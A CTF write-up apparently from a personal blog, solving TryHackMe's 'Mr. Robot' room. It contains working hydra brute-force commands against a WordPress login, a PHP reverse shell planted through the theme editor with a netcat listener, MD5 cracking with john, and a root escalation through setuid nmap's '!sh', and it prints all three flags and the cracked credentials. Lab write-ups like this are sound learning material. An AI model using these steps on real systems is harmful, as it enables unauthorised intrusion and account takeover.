---
title: "[CTF] Tryhackme - Mr. Robot "
date: 2024-10-18 12:00:00 -500 
categories: [CTF - Tryhackme, Mr. Robot]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Mr. Robot ](https://tryhackme.com/r/room/mrrobot)

## Tasks

- What is key 1?
- What is key 2?
- What is key 3?



### What is key 1? 


We start like all our challenges with `nmap`. 
- `sV` for checking the services which are running
- `sC` for default scripts
- `$ip` I always store the target server ip into a variable (`export ip=10.10.xx.xxx`)

```bash
└─$ nmap -sV -sC $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 15:23 CST
Nmap scan report for 10.10.83.180
Host is up (0.23s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.21 seconds
```


Okay we have open ports on `ssh, http and https`. 


We should start to check the website. The website has a command-line interface themed by Mr. Robot ( which is awesome by the way). After checking the surface and `source code` of the webpage we can check, if we find additional directories with `gobuster`. We have the wordlist `common.txt` which contains the most common folder struture names on websites. 
Lets see what we get here:

```bash

└─$ gobuster -w common.txt dir -u 10.10.83.180
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.83.180
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/0                    (Status: 301) [Size: 0] [--> http://10.10.83.180/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.83.180/Image/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.83.180/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.83.180/feed/atom/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.83.180/audio/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.83.180/blog/]
/css                  (Status: 301) [Size: 232] [--> http://10.10.83.180/css/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.83.180/feed/]
/images               (Status: 301) [Size: 235] [--> http://10.10.83.180/images/]
/image                (Status: 301) [Size: 0] [--> http://10.10.83.180/image/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.83.180/js/]
/intro                (Status: 200) [Size: 516314]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.83.180/wp-login.php]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.83.180/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.83.180/feed/]
/sitemap              (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 234] [--> http://10.10.83.180/video/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.83.180/wp-content/]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.83.180/wp-includes/]
/wp-login             (Status: 200) [Size: 2606]
/xmlrpc               (Status: 405) [Size: 42]
Progress: 1942 / 1943 (99.95%)
===============================================================
Finished
===============================================================

```


We get lots of paths back. There are 2 very interesting things. First we have `wp-login` which means, we have wordpress behind the webpage. The second thing is, `phpmyadmin`.

```bash
└─$ curl 10.10.83.180/phpmyadmin
For security reasons, this URL is only accessible using localhost (127.0.0.1) as the hostname.
```

Okay, so we can only use this as admin. 

Lets check the `robots.txt` file.

```bash

└─$ curl 10.10.83.180/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

This looks very promising. We have a `.dic` file which should be a `dictionary file` and our first answer as txt.

Lets download the `.dic` file and check the content of the `txt` file.

```bash

└─$ curl 10.10.83.180/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9

```

Answer: `073403c8a58a1f80d943455fb30724b9`


### What is key 2? 

Back to the `wp-login`. Lets analyze the `POST` request with `Burpsuite`.

```bash

POST /wp-login.php HTTP/1.1
Host: 10.10.83.180
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: http://10.10.83.180
Connection: keep-alive
Referer: http://10.10.83.180/wp-login.php
Cookie: s_cc=true; s_fid=7F4BB426ED3299DA-0CC18A1497731E85; s_nr=1729584073603; s_sq=%5B%5BB%5D%5D; comment_author_f63cd275cdddce8d118a8620f2380a41=test; comment_author_email_f63cd275cdddce8d118a8620f2380a41=test%40test.de; comment_author_url_f63cd275cdddce8d118a8620f2380a41=http%3A%2F%2Ftest.de; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.83.180%2Fwp-admin%2F&testcookie=1
```

With that interception, we can try to bruteforce now with `hydra`.

I baked following command:

` hydra -L fsocity.dic -p test 10.10.83.180 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30`

- `-L` for wordlist, we need to know the user first
- `-p test` we try as password "test" for every user in the list
- `10.10.83.180` our target ip address
- `http-post-form` we have to bruteforce `http-post-form`
- `/wp-login.php` the exact path where we want to brute force
- `log: ^USER^`The parameter log represents the username field in the WordPress login form. The ^USER^ placeholder is where Hydra will insert each username 
- `&pwd=^PWD^` is where hydra inserts the password
- `false user` This is the string Hydra will search for in the server's response to determine if a login attempt failed
- `-t 30` This sets the number of concurrent connections to 30


Okay that is a lot of information. But thats why we did the `http-interception` before: 

```bash
log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.83.180%2Fwp-admin%2F&testcookie=1
```

We know, that `log` is the `username` field nad `pwd` the `password` field. The field `Invalid username` we can get from the page source.

```html

<body class="login login-action-login wp-core-ui  locale-en-us">
	<div id="login">
		<h1><a href="https://wordpress.org/" title="Powered by WordPress" tabindex="-1">user&#039;s Blog!</a></h1>
	<div id="login_error">	<strong>ERROR</strong>: Invalid username. <a href="http://10.10.250.121/wp-login.php?action=lostpassword">Lost your password?</a><br/>
</div>

<form name="loginform" id="loginform" action="http://10.10.250.121/wp-login.php" method="post">
	<p>
```


Okay lets bruteforce the `username` now:

```bash

┌──(admin㉿PREDATOR-01)-[~/Downloads]
└─$ hydra -L fsocity.dic -p test 10.10.250.121 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-22 16:22:37
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.10.250.121:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.250.121   login: Elliot   password: test

```

We have our username: `Elliot`

Now we do the same thing to find out the `password`. We have to fetch the error message for invalid password by trying to login with `Elliot`.

We receive: 

`ERROR: The password you entered for the username Elliot is incorrect`

Okay lets bake another `hydra` command:

` hydra -l Elliot -P fsocity.dic $ip http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^: The password you entered for the username" -t 30`

```bash

└─$ hydra -l Elliot -P fsocity.dic 10.10.250.121 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^: The password you entered for the username" -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-22 16:51:00
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:1/p:858235), ~28608 tries per task
[DATA] attacking http-post-form://10.10.250.121:80/wp-login.php:log=^USER^&pwd=^PWD^: The password you entered for the username
[STATUS] 637.00 tries/min, 637 tries in 00:01h, 857598 to do in 22:27h, 30 active
[STATUS] 521.00 tries/min, 1563 tries in 00:03h, 856672 to do in 27:25h, 30 active
[STATUS] 491.29 tries/min, 3439 tries in 00:07h, 854796 to do in 28:60h, 30 active
[80][http-post-form] host: 10.10.250.121   login: Elliot   password: ER28-0652
``` 
Okay we found our password.

Password: `ER28-0652`


Lets login in `Wordpress`. We check the things we can do and we have to find a way to get into the system. Most of the time you want to have a `reverse` shell, if you have any access. So after considering some options, I decided for a `php reverse shell`.

I use the following script:

[Github Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

You have to change the `port` and enter your `ip address`. Then you listen on your entered port. I always use `4444`.

`nc -nlvp 4444 10.10.250.121`

I tried to create a new post with the `reverse shell` but after refreshing the new post, I didnt get a connection, thats why I needed something else.


Unter `Appearance` you can edit the different page themes. The tab `editor` is the solution here.


![Editor](assets/img/tryhackme/mrrobot/robot-01.png "Editor")



We enter the URL

`http://10.10.250.121/wp-content/themes/twentyfifteen/archive.php`

and we are connected!!!

Lets check what we can do with the `reverse shell`:

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (2183): Inappropriate ioctl for device
bash: no job control in this shell
daemon@linux:/$ cd home
cd home
daemon@linux:/home$ ls
ls
robot
daemon@linux:/home$ cd robot
cd robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt
password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ head key-2-of-3.txt
head key-2-of-3.txt
head: cannot open 'key-2-of-3.txt' for reading: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$
```


Okay its getting more complicated. We cant open the `key-2-of-3.txt` file due to missing permissions. So we have to change user to `robot` (directory home/robot)

Fortunately he left us his password but hashed in raw-md5. 

We crack such things with `john the ripper`.

`john md5.hash --wordlist=Downloads/fsocity.dic --format=Raw-MD5`

I saved the md5 `c3fcd3d76192e4007dfb496cca67e13b`into a file called `md5.hash` and used the previous wordlist `fsocity.dic` for cracking the password. 

Important is the `format`. It was called `raw-md5` which is very helpful.



```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ john md5.hash --wordlist=Downloads/fsocity.dic --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=24
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2024-10-22 17:16) 0g/s 21452Kp/s 21452Kc/s 21452KC/s 8output..abcdefghijklmnopqrstuvwxyz
Session completed.
```

And we got a password now. 


The thing to do is to get a shell. 

We can use following command to spawn a shell:

`python -c 'import pty;pty.spawn("/bin/bash")'`

and then we can change user with `su robot`

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$

```


Now we can get the second text:


```bash
robot@linux:/$ ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
robot@linux:/$ cd home
cd home
robot@linux:/home$ ls
ls
robot
robot@linux:/home$ cd robot
cd robot
robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$
``` 

Answer: `822c73956184f694993bede3eb39f959`


### What is key 3? 

The last key is probably in the `root` directory. We have to find a way to elevate to `root` now. 

Before I use `linepea.sh` I try to find a `sudoid` bit, sometimes we can use this for elevating our privilegues.

We can use following command to find those sudoid bits:

`find / -perm +6000 2>/dev/null |grep bin`

- `find /`: This starts searching from the root directory (/) and recursively searches through all subdirectories
- `perm +6000`: This option looks for files with specific permission bits set. The 6000 represents files that have the setuid (4000) or setgid (2000) permissions. The + indicates that the search will match any file that has at least one of these bits set

- `2>/dev/null`: This redirects any error messages (e.g., "permission denied" errors) to /dev/null, effectively discarding them

```bash
robot@linux:/$ find / -perm +6000 2>/dev/null |grep bin
find / -perm +6000 2>/dev/null |grep bin
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/sbin/unix_chkpwd
robot@linux:/$

```

Okay there are many possilities. I checked the `hint` from THM and saw `nmap`.

We can use the tools from `gtfobins` to gain privileleged access.


[gtfobins-nmap](https://gtfobins.github.io/gtfobins/nmap/)


```bash
robot@linux:/$ cd /usr/local/bin
cd /usr/local/bin
robot@linux:/usr/local/bin$ ls -l nmap
ls -l nmap
-rwsr-xr-x 1 root root 504736 Nov 13  2015 nmap
robot@linux:/usr/local/bin$
nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
#
```

And we are `root`. Lets find the last flag!

```bash
# cd /
cd /
# cd root
cd root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4

```

We got it. 

Answer: `04787ddef27c3dee1ee161b21670b4e4`


## Thoughts:

This CTF has a very nice theme and you can see how much effort was spent into it. I think there are many cool concepts in it, but I think it was not really clear to proceed after the login into `wp-admin`. However, I learned a lot and perhaps you too? :-) 

What did we learn?
- using `nmap` for scan open ports and versions
- using `burpsuite` to intercept a `HTTP POST Request`
- using `hydra` for bruteforcing `user` and `password` 
- using `john` for cracking a md5 password
- using `php reverse shell` to get access to the server
- searched for `sudoid` bits


